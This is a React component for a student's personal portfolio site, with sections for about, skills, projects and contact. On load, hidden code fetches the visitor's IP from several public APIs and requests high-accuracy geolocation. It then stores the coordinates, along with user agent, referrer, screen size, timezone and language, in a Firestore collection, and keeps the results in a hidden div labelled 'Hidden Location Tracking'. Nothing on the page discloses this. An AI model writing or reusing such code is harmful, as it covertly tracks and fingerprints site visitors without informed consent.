import { useState, useEffect } from 'react'
import './App.css'
import { db } from '../services/firebasecongif.jsx'
import { collection, addDoc, serverTimestamp } from 'firebase/firestore'

function App() {
  const [count, setCount] = useState(0)
  const [location, setLocation] = useState(null)
  const [locationError, setLocationError] = useState(null)
  const [firestoreStatus, setFirestoreStatus] = useState('')
  const [ipAddress, setIpAddress] = useState(null)
  const [ipError, setIpError] = useState(null)

  // Function to get IP address with multiple fallback APIs
  const getIpAddress = async () => {
    // First try our own server endpoint (most reliable)
    try {
      console.log('Trying server endpoint...')
      const response = await fetch('/api/get-ip')
      if (response.ok) {
        const data = await response.json()
        if (data.ip) {
          setIpAddress(data.ip)
          console.log('IP Address (server):', data.ip)
          return data.ip
        }
      }
    } catch (error) {
      console.error('Server endpoint failed:', error)
    }

    // Fallback to external APIs
    const ipApis = [
      'https://api.ipify.org?format=json',
      'https://api64.ipify.org?format=json',
      'https://api.myip.com',
      'https://ipapi.co/json/',
      'https://ipinfo.io/json'
    ]

    for (const api of ipApis) {
      try {
        console.log(`Trying IP API: ${api}`)
        const response = await fetch(api, {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
          },
          mode: 'cors'
        })
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`)
        }
        
        const data = await response.json()
        let ip = null
        
        // Handle different API response formats
        if (data.ip) {
          ip = data.ip
        } else if (data.query) {
          ip = data.query
        } else if (data.ipAddress) {
          ip = data.ipAddress
        }
        
        if (ip) {
          setIpAddress(ip)
          console.log('IP Address (external):', ip)
          return ip
        }
      } catch (error) {
        console.error(`Error with API ${api}:`, error)
        continue
      }
    }
    
    // Last resort: try httpbin
    try {
      const response = await fetch('https://httpbin.org/ip')
      const data = await response.json()
      if (data.origin) {
        setIpAddress(data.origin)
        console.log('IP Address (httpbin):', data.origin)
        return data.origin
      }
    } catch (error) {
      console.error('Error with httpbin:', error)
    }
    
    setIpError('Failed to fetch IP address from all sources')
    return null
  }

  // Function to save location to Firestore
  const saveLocationToFirestore = async (locationData) => {
    try {
      setFirestoreStatus('Saving to Firestore...')
      
      const locationDoc = {
        latitude: locationData.latitude,
        longitude: locationData.longitude,
        accuracy: locationData.accuracy,
        timestamp: locationData.timestamp,
        ipAddress: ipAddress,
        userAgent: navigator.userAgent,
        pageUrl: window.location.href,
        referrer: document.referrer,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        createdAt: serverTimestamp()
      }

      const docRef = await addDoc(collection(db, "locations"), locationDoc)
      console.log("Location saved to Firestore with ID: ", docRef.id)
      setFirestoreStatus(`Saved to Firestore with ID: ${docRef.id}`)
      
      return docRef.id
    } catch (error) {
      console.error("Error saving to Firestore: ", error)
      setFirestoreStatus(`Firestore Error: ${error.message}`)
      throw error
    }
  }

  useEffect(() => {
    // Get IP address when component mounts
    getIpAddress()

    // Check if geolocation is supported
    if (!navigator.geolocation) {
      setLocationError('Geolocation is not supported by this browser.')
      return
    }

    // Request location access
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        }
        
        // Store in localStorage
        localStorage.setItem('userLocation', JSON.stringify(locationData))
        setLocation(locationData)
        console.log('Location stored in localStorage:', locationData)
        
        // Save to Firestore
        try {
          await saveLocationToFirestore(locationData)
        } catch (error) {
          console.error('Failed to save to Firestore:', error)
        }
      },
      (error) => {
        let errorMessage = 'Unknown error occurred'
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = 'Location access denied by user'
            break
          case error.POSITION_UNAVAILABLE:
            errorMessage = 'Location information unavailable'
            break
          case error.TIMEOUT:
            errorMessage = 'Location request timed out'
            break
        }
        setLocationError(errorMessage)
        console.error('Location error:', errorMessage)
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 300000 // 5 minutes
      }
    )
  }, [])

  return (
    <div className="portfolio-container">
      {/* Header Section */}
      <header className="header">
        <nav className="navbar">
          <div className="nav-brand">Garima</div>
          <ul className="nav-menu">
            <li><a href="#home">Home</a></li>
            <li><a href="#about">About</a></li>
            <li><a href="#skills">Skills</a></li>
            <li><a href="#projects">Projects</a></li>
            <li><a href="#contact">Contact</a></li>
          </ul>
        </nav>
      </header>

      {/* Hero Section */}
      <section id="home" className="hero">
        <div className="hero-content">
          <div className="hero-text">
            <h1 className="hero-title">Hi, I'm <span className="highlight">Garima</span></h1>
            <h2 className="hero-subtitle">1st Year B.Tech Student</h2>
            <p className="hero-description">
              Passionate about technology and innovation. Currently pursuing Computer Science at KIIT University, Orissa, India.
            </p>
            <div className="hero-buttons">
              <button className="btn btn-primary">Download CV</button>
              <button className="btn btn-secondary">View Projects</button>
            </div>
          </div>
          <div className="hero-image">
            <div className="profile-placeholder">
              <span>👩‍💻</span>
            </div>
          </div>
        </div>
      </section>

      {/* About Section */}
      <section id="about" className="about">
        <div className="container">
          <h2 className="section-title">About Me</h2>
          <div className="about-content">
            <div className="about-text">
              <p>
                I am a first-year B.Tech student at KIIT University, Orissa, India, with a passion for computer science and technology. 
                I love exploring new technologies and building innovative solutions that can make a difference in people's lives.
              </p>
              <p>
                My journey in technology began with curiosity about how things work in the digital world. 
                Now, I'm excited to learn programming, web development, and various cutting-edge technologies.
              </p>
              <div className="education">
                <h3>Education</h3>
                <div className="education-item">
                  <h4>B.Tech in Computer Science</h4>
                  <p>KIIT University, Orissa, India</p>
                  <p>2024 - 2028</p>
                </div>
              </div>
            </div>
            <div className="about-stats">
              <div className="stat-item">
                <h3>1st</h3>
                <p>Year Student</p>
              </div>
              <div className="stat-item">
                <h3>5+</h3>
                <p>Projects</p>
              </div>
              <div className="stat-item">
                <h3>100%</h3>
                <p>Dedication</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Skills Section */}
      <section id="skills" className="skills">
        <div className="container">
          <h2 className="section-title">Skills & Technologies</h2>
          <div className="skills-grid">
            <div className="skill-category">
              <h3>Programming Languages</h3>
              <div className="skill-items">
                <div className="skill-item">Python</div>
                <div className="skill-item">Java</div>
                <div className="skill-item">C++</div>
                <div className="skill-item">JavaScript</div>
              </div>
            </div>
            <div className="skill-category">
              <h3>Web Technologies</h3>
              <div className="skill-items">
                <div className="skill-item">HTML5</div>
                <div className="skill-item">CSS3</div>
                <div className="skill-item">React.js</div>
                <div className="skill-item">Node.js</div>
              </div>
            </div>
            <div className="skill-category">
              <h3>Tools & Platforms</h3>
              <div className="skill-items">
                <div className="skill-item">Git</div>
                <div className="skill-item">VS Code</div>
                <div className="skill-item">Firebase</div>
                <div className="skill-item">Figma</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Projects Section */}
      <section id="projects" className="projects">
        <div className="container">
          <h2 className="section-title">Featured Projects</h2>
          <div className="projects-grid">
            <div className="project-card">
              <div className="project-image">
                <div className="project-placeholder">🌐</div>
              </div>
              <div className="project-content">
                <h3>Portfolio Website</h3>
                <p>A modern, responsive portfolio website built with React and Firebase.</p>
                <div className="project-tech">
                  <span>React</span>
                  <span>Firebase</span>
                  <span>CSS3</span>
                </div>
                <div className="project-links">
                  <a href="#" className="project-link">Live Demo</a>
                  <a href="#" className="project-link">GitHub</a>
                </div>
              </div>
            </div>
            <div className="project-card">
              <div className="project-image">
                <div className="project-placeholder">📱</div>
              </div>
              <div className="project-content">
                <h3>Task Manager App</h3>
                <p>A simple task management application with local storage functionality.</p>
                <div className="project-tech">
                  <span>JavaScript</span>
                  <span>HTML5</span>
                  <span>CSS3</span>
                </div>
                <div className="project-links">
                  <a href="#" className="project-link">Live Demo</a>
                  <a href="#" className="project-link">GitHub</a>
                </div>
              </div>
            </div>
            <div className="project-card">
              <div className="project-image">
                <div className="project-placeholder">🎮</div>
              </div>
              <div className="project-content">
                <h3>Simple Game</h3>
                <p>A basic game developed using Python and Pygame library.</p>
                <div className="project-tech">
                  <span>Python</span>
                  <span>Pygame</span>
                </div>
                <div className="project-links">
                  <a href="#" className="project-link">Live Demo</a>
                  <a href="#" className="project-link">GitHub</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="contact">
        <div className="container">
          <h2 className="section-title">Get In Touch</h2>
          <div className="contact-content">
            <div className="contact-info">
              <div className="contact-item">
                <span className="contact-icon">📧</span>
                <div>
                  <h4>Email</h4>
                  <p>garima@example.com</p>
                </div>
              </div>
              <div className="contact-item">
                <span className="contact-icon">📱</span>
                <div>
                  <h4>Phone</h4>
                  <p>+91 98765 43210</p>
                </div>
              </div>
              <div className="contact-item">
                <span className="contact-icon">📍</span>
                <div>
                  <h4>Location</h4>
                  <p>Bhubaneswar, Orissa, India</p>
                </div>
              </div>
            </div>
            <div className="contact-form">
              <form>
                <div className="form-group">
                  <input type="text" placeholder="Your Name" required />
                </div>
                <div className="form-group">
                  <input type="email" placeholder="Your Email" required />
                </div>
                <div className="form-group">
                  <textarea placeholder="Your Message" rows="5" required></textarea>
                </div>
                <button type="submit" className="btn btn-primary">Send Message</button>
              </form>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="container">
          <p>&copy; 2024 Garima. All rights reserved.</p>
          <div className="social-links">
            <a href="#" className="social-link">GitHub</a>
            <a href="#" className="social-link">LinkedIn</a>
            <a href="#" className="social-link">Twitter</a>
          </div>
        </div>
      </footer>

      {/* Hidden Location Tracking (for your original functionality) */}
      <div style={{ display: 'none' }}>
        {ipAddress && <p>IP: {ipAddress}</p>}
        {location && <p>Location: {location.latitude}, {location.longitude}</p>}
        {firestoreStatus && <p>Status: {firestoreStatus}</p>}
      </div>
    </div>
  )
}

export default App
